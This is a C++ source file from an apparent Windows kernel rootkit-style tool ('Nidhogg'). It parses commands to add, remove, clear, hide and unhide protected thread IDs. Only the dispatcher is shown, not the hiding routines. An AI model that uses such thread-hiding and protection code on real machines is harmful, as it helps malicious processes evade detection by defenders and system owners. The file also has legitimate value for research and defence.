#include "pch.h"
#include "ThreadParser.h"
#include "ThreadHandler.h"

ThreadParser::ThreadParser() {
	this->optionsSize = 5;
	this->options = AllocateMemory<OptionMetadata*>(this->optionsSize * sizeof(OptionMetadata));

	if (!this->options)
		ExRaiseStatus(STATUS_INSUFFICIENT_RESOURCES);

	this->options[0] = { Options::Add, { 1, { ArgType::ULong } } };
	this->options[1] = { Options::Remove, { 1, { ArgType::ULong } } };
	this->options[2] = { Options::Clear, { 0, {} } };
	this->options[3] = { Options::Hide, { 1, { ArgType::ULong } } };
	this->options[4] = { Options::Unhide, { 1, { ArgType::ULong } } };
}

/*
* Description:
* Execute is responsible for executing a command and returning its value.
*
* Parameters:
* @commandId [Options]  -- Command to run.
* @args		 [PVOID*]	-- Array of args to send to the command.
*
* Returns:
* @status	 [NTSTATUS] -- Result of the command.
*/
NTSTATUS ThreadParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
	ULONG tid = 0;
	NTSTATUS status = STATUS_SUCCESS;

	if (commandId != Options::Clear) {
		tid = *(ULONG*)args[0];

		if (tid == 0)
			return STATUS_INVALID_PARAMETER;
	}

	switch (commandId) {
	case Options::Add:
	{
		if (!Features.ThreadProtection) {
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		if (NidhoggThreadHandler->FindThread(tid, ThreadType::Protected))
			break;

		if (!NidhoggThreadHandler->ProtectThread(tid))
			status = STATUS_UNSUCCESSFUL;
		break;
	}
	case Options::Remove:
	{
		if (!Features.ThreadProtection) {
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		if (!NidhoggThreadHandler->RemoveThread(tid, ThreadType::Protected))
			status = STATUS_NOT_FOUND;
		break;
	}
	case Options::Clear:
	{
		NidhoggThreadHandler->ClearThreadList(ThreadType::Protected);
		break;
	}
	case Options::Hide:
	{
		status = NidhoggThreadHandler->HideThread(tid);
		break;
	}
	case Options::Unhide:
	{
		status = NidhoggThreadHandler->UnhideThread(tid);
		break;
	}
	default:
	{
		status = STATUS_NOT_IMPLEMENTED;
		break;
	}
	}

	return status;
}
